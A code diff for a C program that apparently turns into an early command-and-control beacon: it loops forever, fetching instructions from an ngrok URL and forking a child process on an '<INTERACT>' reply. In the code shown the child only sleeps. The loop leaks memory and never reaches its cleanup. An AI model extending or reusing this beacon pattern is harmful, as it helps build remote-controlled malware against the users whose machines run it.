@@ -14,33 +14,50 @@ typedef struct {
 } Response;
 
 size_t write_chunk(void *data, size_t size, size_t nmemb, void *userdata);
+void get_executors_command();
 
 int main(){
+	get_executors_command();
+	return 0;
+}
+
+void get_executors_command(){
 	CURL *curl;
 	CURLcode result;
 	curl = curl_easy_init();
 	if (curl == NULL){
 		fprintf(stderr, "request failed\n");
-		return -1;
+		return;
 	}
 	Response response;
-	response.string = malloc(1);
-	response.size = 0;
+	while (1){
+		response.string = malloc(1);
+		response.size = 0;
 
-	curl_easy_setopt(curl, CURLOPT_URL, "https://allegedly-great-shiner.ngrok-free.app");
-	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_chunk);
-	curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&response);
+		curl_easy_setopt(curl, CURLOPT_URL, "https://allegedly-great-shiner.ngrok-free.app");
+		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_chunk);
+		curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&response);
 
-	result = curl_easy_perform(curl);
+		result = curl_easy_perform(curl);
 
-	if (result != CURLE_OK){
-		fprintf(stderr, "Error\n");
-		return -1;
+		if (result != CURLE_OK){
+			fprintf(stderr, "Error\n");
+			continue;
+		}
+		if (strcmp(response.string, "<NULL>") == 0){
+			printf("do nothing\n");
+		} else if (strcmp(response.string, "<INTERACT>") == 0){
+			int pid = fork();
+			if (pid == 0){
+				printf("child start");
+				sleep(10);
+				printf("child stop");
+				exit(0);
+			}
+		}
 	}
-	printf("%s\n", response.string);
 	curl_easy_cleanup(curl);
 	free(response.string);
-	return 0;
 }
 
 size_t write_chunk(void *data, size_t size, size_t nmemb, void *userdata){
